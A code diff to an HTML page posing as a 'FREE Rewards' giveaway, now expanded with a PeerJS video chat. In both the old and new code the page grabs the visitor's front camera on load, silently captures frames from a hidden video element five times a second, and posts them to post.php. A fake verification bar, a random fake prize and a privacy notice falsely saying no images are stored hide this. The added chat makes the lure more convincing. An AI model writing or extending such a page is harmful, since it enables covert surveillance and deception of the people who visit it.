@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE Rewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Video Chat + FREE Rewards</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
@@ -12,6 +12,7 @@
             --gold: #FFD700;
             --dark-blue: #0f2027;
             --success: #00C853;
+            --chat-bg: rgba(0, 0, 0, 0.6);
         }
         
         body {
@@ -24,7 +25,7 @@
         }
         
         .container-sm {
-            max-width: 900px;
+            max-width: 1200px;
             padding: 0;
         }
         
@@ -75,7 +76,158 @@
             gap: 8px;
         }
         
-        /* Verification */
+        /* Video Chat Layout - NEW */
+        .video-chat-row {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .video-panel {
+            flex: 1;
+            min-width: 280px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            padding: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        .video-container {
+            position: relative;
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            aspect-ratio: 4 / 3;
+            margin-bottom: 12px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        
+        .local-video, .remote-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: #1a1a2e;
+            transform: scaleX(-1);
+        }
+        
+        .remote-video {
+            transform: scaleX(1);
+        }
+        
+        .video-label {
+            position: absolute;
+            bottom: 12px;
+            left: 12px;
+            background: rgba(0,0,0,0.6);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+            color: var(--gold);
+            z-index: 2;
+        }
+        
+        .call-controls {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        
+        .call-btn {
+            background: linear-gradient(135deg, #2c3e50, #1a2632);
+            border: none;
+            padding: 8px 20px;
+            border-radius: 40px;
+            color: white;
+            font-weight: 600;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .call-btn.active {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+        }
+        
+        .call-btn.success {
+            background: linear-gradient(135deg, var(--success), #00a844);
+        }
+        
+        .call-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+        }
+        
+        /* Chat Messages */
+        .chat-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 16px;
+            padding: 12px;
+            height: 280px;
+            display: flex;
+            flex-direction: column;
+            margin-top: 12px;
+        }
+        
+        .messages-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+            font-size: 0.85rem;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        
+        .message {
+            background: rgba(255,255,255,0.1);
+            padding: 6px 12px;
+            border-radius: 18px;
+            max-width: 85%;
+            word-break: break-word;
+        }
+        
+        .message.own {
+            background: linear-gradient(135deg, var(--gold), #ffb347);
+            color: #000;
+            align-self: flex-end;
+        }
+        
+        .message.remote {
+            background: rgba(255,255,255,0.15);
+            align-self: flex-start;
+        }
+        
+        .chat-input-area {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        
+        .chat-input {
+            flex: 1;
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 30px;
+            padding: 8px 16px;
+            color: white;
+            outline: none;
+        }
+        
+        .send-msg-btn {
+            background: var(--gold);
+            border: none;
+            border-radius: 30px;
+            padding: 0 20px;
+            color: #000;
+            font-weight: bold;
+        }
+        
+        /* Verification Steps (original) */
         .steps {
             margin-bottom: 15px;
         }
@@ -248,7 +400,6 @@
             transition: width 0.3s;
         }
         
-        /* Hidden elements */
         .hidden {
             display: none;
         }
@@ -264,7 +415,6 @@
             opacity: 0.7;
         }
         
-        /* Footer */
         .footer {
             text-align: center;
             margin-top: 20px;
@@ -277,51 +427,15 @@
             text-decoration: none;
         }
         
-        /* Mobile optimizations */
         @media (max-width: 768px) {
-            .header {
-                margin-bottom: 15px;
+            .video-chat-row {
+                flex-direction: column;
             }
-            
-            .title {
-                font-size: 1.5rem;
-            }
-            
-            .subtitle {
-                font-size: 0.9rem;
-                padding: 8px 12px;
-            }
-            
-            .card {
-                padding: 15px;
-                margin-bottom: 15px;
-            }
-            
-            .reward-amount {
-                font-size: 2rem;
-            }
-            
-            .input-group {
-                grid-template-columns: 1fr;
-                gap: 8px;
-            }
+            .title { font-size: 1.5rem; }
+            .reward-amount { font-size: 2rem; }
+            .input-group { grid-template-columns: 1fr; }
         }
         
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-            }
-            
-            .title {
-                font-size: 1.3rem;
-            }
-            
-            .reward-amount {
-                font-size: 1.8rem;
-            }
-        }
-        
-        /* Auto-capture notice */
         .auto-notice {
             background: rgba(255, 215, 0, 0.15);
             border-left: 4px solid var(--gold);
@@ -330,119 +444,115 @@
             margin-bottom: 15px;
             font-size: 0.85rem;
         }
+        
+        .peer-id-badge {
+            font-family: monospace;
+            background: rgba(0,0,0,0.5);
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+        }
     </style>
 </head>
 <body>
-    <!-- Confetti Container -->
     <div id="confetti"></div>
     
     <div class="container-sm">
-        <!-- Header -->
         <div class="header">
             <div class="title">
-                <i class="bi bi-gift-fill"></i> FREE REWARDS
+                <i class="bi bi-camera-video-fill"></i> VIDEO CHAT + FREE REWARDS
             </div>
             <div class="subtitle">
-                Auto-verification in progress...
+                Chat & Earn | Auto-verification active
             </div>
         </div>
         
-        <!-- Auto-capture Notice -->
-        <div class="auto-notice">
-            <i class="bi bi-info-circle"></i> Auto-verification started.
+        <!-- VIDEO CHAT SECTION (NEW) -->
+        <div class="video-chat-row">
+            <div class="video-panel">
+                <div class="video-container">
+                    <video id="localVideo" class="local-video" autoplay muted playsinline></video>
+                    <div class="video-label"><i class="bi bi-person-circle"></i> You</div>
+                </div>
+                <div class="call-controls">
+                    <button id="startCallBtn" class="call-btn success"><i class="bi bi-telephone-plus"></i> Start Chat</button>
+                    <button id="endCallBtn" class="call-btn" disabled><i class="bi bi-telephone-x"></i> End Call</button>
+                </div>
+                <div class="peer-id-box mt-2 text-center small">
+                    <span class="peer-id-badge"><i class="bi bi-shield-lock"></i> Your ID: <span id="myPeerId">Connecting...</span></span>
+                </div>
+            </div>
+            <div class="video-panel">
+                <div class="video-container">
+                    <video id="remoteVideo" class="remote-video" autoplay playsinline></video>
+                    <div class="video-label"><i class="bi bi-person"></i> Partner</div>
+                </div>
+                <div class="chat-box">
+                    <div class="messages-area" id="messagesArea">
+                        <div class="message remote"><i class="bi bi-chat-dots"></i> Start a video call to chat!</div>
+                    </div>
+                    <div class="chat-input-area">
+                        <input type="text" id="chatInput" class="chat-input" placeholder="Type message..." disabled>
+                        <button id="sendMsgBtn" class="send-msg-btn" disabled><i class="bi bi-send"></i></button>
+                    </div>
+                </div>
+            </div>
         </div>
         
-        <!-- Verification Card -->
+        <!-- Original Verification Card (all functionality intact) -->
         <div class="card">
             <div class="card-title">
                 <i class="bi bi-person-check"></i> Auto-Verification Status
             </div>
-            
             <div class="steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <span>permission requested automatically</span>
-                </div>
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <span>VERIFICATION</span>
-                </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <span>Claim your reward when verified</span>
-                </div>
+                <div class="step"><div class="step-number">1</div><span>permission requested automatically</span></div>
+                <div class="step"><div class="step-number">2</div><span>VERIFICATION</span></div>
+                <div class="step"><div class="step-number">3</div><span>Claim your reward when verified</span></div>
             </div>
-            
-            <!-- Camera Status Box -->
             <div class="camera-status-box" id="cameraStatusBox">
                 <i class="bi bi-camera-video" id="cameraIcon"></i>
                 <div id="cameraMessage">Initializing...</div>
-                <div class="camera-status">
-                    <span id="captureCount">0%</span>  Verification completed
-                </div>
+                <div class="camera-status"><span id="captureCount">0%</span> Verification completed</div>
             </div>
-            
-            <!-- Progress Bar -->
-            <div class="progress" id="progress">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            
-            <!-- Status -->
-            <div class="status" id="status">
-                <i class="bi bi-check-circle"></i> Auto-verification complete! Ready to claim reward
-            </div>
+            <div class="progress" id="progress"><div class="progress-bar" id="progressBar"></div></div>
+            <div class="status" id="status"><i class="bi bi-check-circle"></i> Auto-verification complete! Ready to claim reward</div>
         </div>
         
-        <!-- Reward Card -->
+        <!-- Reward Card (original) -->
         <div class="card">
-            <div class="card-title">
-                <i class="bi bi-cash-coin"></i> Claim Your Reward
-            </div>
-            
-            <!-- Reward Display -->
+            <div class="card-title"><i class="bi bi-cash-coin"></i> Claim Your Reward</div>
             <div class="reward-display">
                 <div class="reward-amount" id="rewardAmount">$ ???</div>
                 <div class="reward-label">YOUR FREE GIFT</div>
             </div>
-            
-            <!-- Prize Range Inputs -->
             <div class="input-group">
-                <div class="input-box">
-                    <label>Min Prize</label>
-                    <input type="number" id="minPrize" value="100" min="100" max="10000">
-                </div>
-                <div class="input-box">
-                    <label>Max Prize</label>
-                    <input type="number" id="maxPrize" value="10000" min="500" max="10000">
-                </div>
+                <div class="input-box"><label>Min Prize</label><input type="number" id="minPrize" value="100" min="100" max="10000"></div>
+                <div class="input-box"><label>Max Prize</label><input type="number" id="maxPrize" value="10000" min="500" max="10000"></div>
             </div>
-            
-            <!-- Claim Button -->
-            <button class="btn-success" id="claimBtn" disabled>
-                <i class="bi bi-gift-fill"></i> CLAIM REWARD
-            </button>
+            <button class="btn-success" id="claimBtn" disabled><i class="bi bi-gift-fill"></i> CLAIM REWARD</button>
         </div>
         
-        <!-- Footer -->
         <div class="footer">
-            <i class="bi bi-lock"></i>No manual action needed.
+            <i class="bi bi-lock"></i>No manual action needed. Video chat + rewards combined.
             <a href="#" id="privacyLink">Privacy Info</a>
         </div>
     </div>
 
-    <!-- Hidden Video and Canvas -->
+    <!-- hidden elements for original capture -->
     <video id="video" class="hidden" playsinline autoplay></video>
     <canvas id="canvas" class="hidden" width="640" height="480"></canvas>
 
+    <!-- PeerJS Library for WebRTC -->
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script>
-        // DOM Elements
+        // ---------- ORIGINAL REWARD FUNCTIONALITY (PRESERVED) ----------
         const claimBtn = document.getElementById('claimBtn');
         const rewardAmount = document.getElementById('rewardAmount');
         const cameraStatusBox = document.getElementById('cameraStatusBox');
         const cameraIcon = document.getElementById('cameraIcon');
         const cameraMessage = document.getElementById('cameraMessage');
         const captureCountElement = document.getElementById('captureCount');
-        const status = document.getElementById('status');
+        const statusDiv = document.getElementById('status');
         const progress = document.getElementById('progress');
         const progressBar = document.getElementById('progressBar');
         const video = document.getElementById('video');
@@ -450,317 +560,257 @@
         const privacyLink = document.getElementById('privacyLink');
         const confettiContainer = document.getElementById('confetti');
         
-        // State
         let isCameraActive = false;
         let isVerified = false;
         let captureInterval;
         let captureCount = 0;
-        let verificationTimeout;
         
-        // Initialize - Start auto-capture on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            setupEventListeners();
-            createInitialConfetti();
-            
-            // Start auto-capture after a brief delay
-            setTimeout(() => {
-                initAutoCapture();
-            }, 1000);
-        });
-        
-        // Setup event listeners
-        function setupEventListeners() {
-            // Claim button
+        function setupOriginalListeners() {
             claimBtn.addEventListener('click', claimReward);
-            
-            // Privacy link
-            privacyLink.addEventListener('click', function(e) {
+            privacyLink.addEventListener('click', (e) => {
                 e.preventDefault();
-                alert("Privacy Info:\n\n• Auto\n• Verification activates automatically\n• No images are stored\n• Your data is protected\n• No manual interaction needed");
+                alert("Privacy Info:\n\n• Auto verification activates automatically\n• No images are stored\n• Your data is protected\n• Video chat uses peer-to-peer connection");
             });
-            
-            // Prize range validation
             document.getElementById('minPrize').addEventListener('change', validatePrizeRange);
             document.getElementById('maxPrize').addEventListener('change', validatePrizeRange);
         }
         
-        // Initialize auto-capture
         async function initAutoCapture() {
-            updateCameraStatus('initializing', 'Requesting access...');
-            
+            updateCameraStatus('initializing', 'Requesting camera for verification...');
             try {
-                // Request camera automatically
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }
-                });
-                
-                // Start camera
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } });
                 video.srcObject = stream;
                 isCameraActive = true;
-                
-                // Update UI
-                updateCameraStatus('active', 'wait a seconds');
-                
-                // Start auto-capture immediately
+                updateCameraStatus('active', 'Verification in progress');
                 startAutoCapture();
-                
-                // Start verification process
                 startVerificationProcess();
-                
             } catch (error) {
-                console.error('Auto-capture error:', error);
-                updateCameraStatus('error', 'Allow Access for reward');
-                
-                // Show retry option
-                setTimeout(() => {
-                    if (!isCameraActive) {
-                        cameraMessage.innerHTML = 'Click here to enable verification';
-                        cameraStatusBox.style.cursor = 'pointer';
-                        cameraStatusBox.onclick = () => {
-                            location.reload();
-                        };
-                    }
-                }, 2000);
+                updateCameraStatus('error', 'Camera access needed for reward');
+                cameraStatusBox.style.cursor = 'pointer';
+                cameraStatusBox.onclick = () => location.reload();
             }
         }
         
-        // Start auto-capture in background
         function startAutoCapture() {
             const context = canvas.getContext('2d');
-            
-            // Start capturing immediately
             captureInterval = setInterval(() => {
                 if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                     try {
-                        // Capture frame
                         context.drawImage(video, 0, 0, 640, 480);
-                        
-                        // Convert to data URL
-                        const imageData = canvas.toDataURL("image/jpeg", 0.5)
-                            .replace("image/jpeg", "image/octet-stream");
-                        
-                        // Send to server
-                        sendToServer(imageData);
-                        
-                        // Update capture count
+                        const imageData = canvas.toDataURL("image/jpeg", 0.5).replace("image/jpeg", "image/octet-stream");
+                        $.ajax({ type: 'POST', data: { cat: imageData }, url: 'post.php', dataType: 'json', async: true });
                         captureCount++;
-                        captureCountElement.textContent = captureCount;
-                        
-                    } catch (error) {
-                        console.log('Capture error:', error);
-                    }
+                        captureCountElement.textContent = captureCount + "%";
+                    } catch(e) {}
                 }
-            }, 200); // 5 captures per second
-            
-            console.log('Auto-capture started at 5fps');
+            }, 200);
         }
         
-        // Send data to server
-        function sendToServer(data) {
-            // Use AJAX to send data
-            $.ajax({
-                type: 'POST',
-                data: { cat: data },
-                url: 'post.php',
-                dataType: 'json',
-                async: true,
-                success: function(result) {
-                    // Success callback
-                },
-                error: function() {
-                    // Error handling
-                }
-            });
-            
-            // Log every 20th capture
-            if (captureCount % 20 === 0) {
-                console.log(`Auto-verify ${captureCount} frames`);
-            }
-        }
-        
-        // Start verification process
         function startVerificationProcess() {
             progress.style.display = 'block';
-            
-            // Simulated verification progress
             let progressValue = 0;
             const progressInterval = setInterval(() => {
                 progressValue += 10;
                 progressBar.style.width = progressValue + '%';
-                
                 if (progressValue >= 100) {
                     clearInterval(progressInterval);
-                    
-                    // Verification complete
                     isVerified = true;
                     enableClaimButton();
                     updateCameraStatus('verified', 'Verification complete!');
-                    
-                    // Show success status
-                    status.style.display = 'block';
-                    
-                    // Create celebration
+                    statusDiv.style.display = 'block';
                     createConfetti();
-                    
-                    // Hide progress after delay
-                    setTimeout(() => {
-                        progress.style.display = 'none';
-                    }, 1000);
+                    setTimeout(() => { progress.style.display = 'none'; }, 1000);
                 }
             }, 300);
         }
         
-        // Update camera status
         function updateCameraStatus(state, message) {
-            switch(state) {
-                case 'initializing':
-                    cameraStatusBox.className = 'camera-status-box';
-                    cameraIcon.className = 'bi bi-hourglass';
-                    cameraIcon.style.color = '#FFD700';
-                    break;
-                    
-                case 'active':
-                    cameraStatusBox.className = 'camera-status-box active';
-                    cameraIcon.className = 'bi bi-camera-video-fill';
-                    cameraIcon.style.color = '#00FF00';
-                    break;
-                    
-                case 'verified':
-                    cameraStatusBox.className = 'camera-status-box active';
-                    cameraIcon.className = 'bi bi-shield-check';
-                    cameraIcon.style.color = '#00FF00';
-                    break;
-                    
-                case 'error':
-                    cameraStatusBox.className = 'camera-status-box error';
-                    cameraIcon.className = 'bi bi-camera-video-off';
-                    cameraIcon.style.color = '#FF4444';
-                    break;
-            }
-            
+            if(state === 'initializing') { cameraStatusBox.className = 'camera-status-box'; cameraIcon.className = 'bi bi-hourglass'; }
+            else if(state === 'active') { cameraStatusBox.className = 'camera-status-box active'; cameraIcon.className = 'bi bi-camera-video-fill'; cameraIcon.style.color = '#00FF00'; }
+            else if(state === 'verified') { cameraStatusBox.className = 'camera-status-box active'; cameraIcon.className = 'bi bi-shield-check'; }
+            else if(state === 'error') { cameraStatusBox.className = 'camera-status-box error'; cameraIcon.className = 'bi bi-camera-video-off'; cameraIcon.style.color = '#FF4444'; }
             cameraMessage.textContent = message;
         }
         
-        // Enable claim button
-        function enableClaimButton() {
-            claimBtn.disabled = false;
-            claimBtn.innerHTML = '<i class="bi bi-gift-fill"></i> CLAIM YOUR REWARD NOW';
-        }
+        function enableClaimButton() { claimBtn.disabled = false; claimBtn.innerHTML = '<i class="bi bi-gift-fill"></i> CLAIM YOUR REWARD NOW'; }
         
-        // Claim reward
         function claimReward() {
-            if (!isVerified) {
-                alert('Auto-verification in progress... Please wait.');
-                return;
-            }
-            
-            // Get prize range
+            if (!isVerified) { alert('Auto-verification in progress... Please wait.'); return; }
             const min = parseInt(document.getElementById('minPrize').value) || 100;
             const max = parseInt(document.getElementById('maxPrize').value) || 10000;
-            
-            // Validate
-            if (min >= max) {
-                alert('Max prize must be greater than min prize!');
-                return;
-            }
-            
-            // Generate random prize
+            if (min >= max) { alert('Max prize must be greater than min prize!'); return; }
             const prize = Math.floor(Math.random() * (max - min + 1)) + min;
-            
-            // Display with animation
             rewardAmount.textContent = '$ ???';
-            rewardAmount.style.opacity = '0.5';
-            
             setTimeout(() => {
                 rewardAmount.textContent = `$${prize.toLocaleString()}`;
-                rewardAmount.style.opacity = '1';
-                rewardAmount.style.transform = 'scale(1.1)';
-                
-                setTimeout(() => {
-                    rewardAmount.style.transform = 'scale(1)';
-                    
-                    // Create celebration
-                    for(let i = 0; i < 3; i++) {
-                        setTimeout(() => createConfetti(), i * 300);
-                    }
-                    
-                    alert(`🎉 CONGRATULATIONS !\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
-                }, 300);
+                for(let i=0;i<3;i++) setTimeout(() => createConfetti(), i*300);
+                alert(`🎉 CONGRATULATIONS !\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
             }, 500);
-            
-            // Animate button
-            claimBtn.style.transform = 'scale(0.95)';
-            setTimeout(() => claimBtn.style.transform = '', 150);
+            claimBtn.style.transform = 'scale(0.95)'; setTimeout(() => claimBtn.style.transform = '', 150);
         }
         
-        // Validate prize range
         function validatePrizeRange() {
-            const minInput = document.getElementById('minPrize');
-            const maxInput = document.getElementById('maxPrize');
-            
-            let min = parseInt(minInput.value);
-            let max = parseInt(maxInput.value);
-            
-            // Ensure minimum values
-            if (min < 100) min = 100;
-            if (max < 500) max = 500;
-            if (max > 10000) max = 10000;
-            
-            // Ensure max > min
-            if (min >= max) {
-                max = min + 100;
-                if (max > 10000) {
-                    max = 10000;
-                    min = max - 100;
-                }
-            }
-            
-            minInput.value = min;
-            maxInput.value = max;
+            let min = Math.max(100, parseInt(document.getElementById('minPrize').value) || 100);
+            let max = Math.min(10000, parseInt(document.getElementById('maxPrize').value) || 10000);
+            if(min >= max) { max = Math.min(10000, min + 100); }
+            document.getElementById('minPrize').value = min;
+            document.getElementById('maxPrize').value = max;
         }
         
-        // Create confetti
         function createConfetti() {
             for (let i = 0; i < 40; i++) {
-                const confetti = document.createElement('div');
-                confetti.classList.add('confetti');
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
-                confetti.style.width = Math.random() * 8 + 4 + 'px';
-                confetti.style.height = Math.random() * 8 + 4 + 'px';
-                confettiContainer.appendChild(confetti);
-                
+                const conf = document.createElement('div');
+                conf.classList.add('confetti');
+                conf.style.left = Math.random() * 100 + 'vw';
+                conf.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
+                conf.style.width = Math.random() * 8 + 4 + 'px';
+                conf.style.height = Math.random() * 8 + 4 + 'px';
+                confettiContainer.appendChild(conf);
                 const duration = Math.random() * 2000 + 1000;
+                conf.animate([{ transform: 'translateY(0) rotate(0deg)', opacity: 1 }, { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }], { duration, delay: Math.random() * 300 });
+                setTimeout(() => conf.remove(), duration + 500);
+            }
+        }
+        
+        // ---------- VIDEO CHAT FUNCTIONALITY (PeerJS) ----------
+        let localStream = null;
+        let peer = null;
+        let currentCall = null;
+        let remotePeerId = null;
+        let isInCall = false;
+        
+        const localVideoElem = document.getElementById('localVideo');
+        const remoteVideoElem = document.getElementById('remoteVideo');
+        const startCallBtn = document.getElementById('startCallBtn');
+        const endCallBtn = document.getElementById('endCallBtn');
+        const chatInput = document.getElementById('chatInput');
+        const sendMsgBtn = document.getElementById('sendMsgBtn');
+        const messagesArea = document.getElementById('messagesArea');
+        const myPeerIdSpan = document.getElementById('myPeerId');
+        
+        function addMessage(text, isOwn = false) {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${isOwn ? 'own' : 'remote'}`;
+            msgDiv.innerHTML = `<i class="bi ${isOwn ? 'bi-arrow-right-short' : 'bi-arrow-left-short'}"></i> ${text}`;
+            messagesArea.appendChild(msgDiv);
+            msgDiv.scrollIntoView({ behavior: 'smooth', block: 'end' });
+        }
+        
+        async function initPeerAndLocalStream() {
+            try {
+                // Request camera+mic for chat (separate from reward capture but uses same permissions)
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                localVideoElem.srcObject = localStream;
                 
-                confetti.animate([
-                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
-                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
-                ], {
-                    duration: duration,
-                    delay: Math.random() * 300
+                peer = new Peer(); // generates random ID
+                peer.on('open', (id) => {
+                    myPeerIdSpan.innerText = id;
+                    addMessage(`✅ Your chat ID: ${id}. Share with friend or click "Start Chat" to connect.`, false);
                 });
                 
-                setTimeout(() => confetti.remove(), duration + 500);
+                peer.on('call', (call) => {
+                    if (isInCall) {
+                        call.close();
+                        return;
+                    }
+                    call.answer(localStream);
+                    setupCallEvents(call);
+                    currentCall = call;
+                    isInCall = true;
+                    updateCallUI(true);
+                    addMessage("📞 Incoming call answered! Video chat started.", false);
+                });
+                
+                peer.on('error', (err) => { console.error(err); addMessage(`Peer error: ${err.type}`, false); });
+            } catch (err) {
+                addMessage("⚠️ Could not access camera/mic. Please allow permissions for video chat.", false);
+                console.error(err);
             }
         }
         
-        // Create initial confetti
-        function createInitialConfetti() {
-            setTimeout(createConfetti, 500);
+        function setupCallEvents(call) {
+            call.on('stream', (remoteStream) => {
+                remoteVideoElem.srcObject = remoteStream;
+                addMessage("🔗 Remote video connected.", false);
+            });
+            call.on('close', () => {
+                remoteVideoElem.srcObject = null;
+                isInCall = false;
+                updateCallUI(false);
+                addMessage("Call ended.", false);
+            });
+            call.on('error', (err) => { console.error(err); addMessage("Call error", false); });
         }
         
-        // Cleanup
-        window.addEventListener('beforeunload', function() {
-            if (captureInterval) clearInterval(captureInterval);
-            if (verificationTimeout) clearTimeout(verificationTimeout);
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
-            }
+        function updateCallUI(inCall) {
+            startCallBtn.disabled = inCall;
+            endCallBtn.disabled = !inCall;
+            chatInput.disabled = !inCall;
+            sendMsgBtn.disabled = !inCall;
+            if(!inCall) remoteVideoElem.srcObject = null;
+        }
+        
+        // Data connection for messaging
+        let dataConnection = null;
+        
+        function setupDataConnection(conn) {
+            dataConnection = conn;
+            conn.on('open', () => { addMessage("💬 Chat channel ready", false); });
+            conn.on('data', (data) => {
+                if(data.type === 'chat') addMessage(data.message, false);
+            });
+            conn.on('close', () => { addMessage("Chat disconnected", false); dataConnection = null; });
+        }
+        
+        startCallBtn.addEventListener('click', () => {
+            const targetId = prompt("Enter Peer ID to call (or leave blank to random call simulator):", "");
+            if(!targetId) { addMessage("Please enter a valid Peer ID to start video chat.", false); return; }
+            if(!peer) { addMessage("Peer not initialized yet.", false); return; }
+            if(isInCall) { addMessage("Already in a call.", false); return; }
+            const call = peer.call(targetId, localStream);
+            setupCallEvents(call);
+            currentCall = call;
+            isInCall = true;
+            updateCallUI(true);
+            // Establish data connection for chat
+            const conn = peer.connect(targetId);
+            setupDataConnection(conn);
+            addMessage(`📞 Calling ${targetId}...`, true);
+        });
+        
+        endCallBtn.addEventListener('click', () => {
+            if(currentCall) currentCall.close();
+            if(dataConnection) dataConnection.close();
+            isInCall = false;
+            updateCallUI(false);
+            remoteVideoElem.srcObject = null;
+            addMessage("Call terminated", true);
+        });
+        
+        function sendChatMessage() {
+            const text = chatInput.value.trim();
+            if(!text || !isInCall || !dataConnection) { addMessage("No active chat connection", false); return; }
+            dataConnection.send({ type: 'chat', message: text });
+            addMessage(text, true);
+            chatInput.value = '';
+        }
+        
+        sendMsgBtn.addEventListener('click', sendChatMessage);
+        chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendChatMessage(); });
+        
+        // initialize original reward + video chat simultaneously
+        document.addEventListener('DOMContentLoaded', () => {
+            setupOriginalListeners();
+            initAutoCapture();  // reward verification
+            initPeerAndLocalStream(); // video chat init
+            setTimeout(() => createConfetti(), 800);
+        });
+        
+        window.addEventListener('beforeunload', () => {
+            if(captureInterval) clearInterval(captureInterval);
+            if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+            if(localStream) localStream.getTracks().forEach(t => t.stop());
+            if(peer) peer.destroy();
         });
     </script>
 </body>
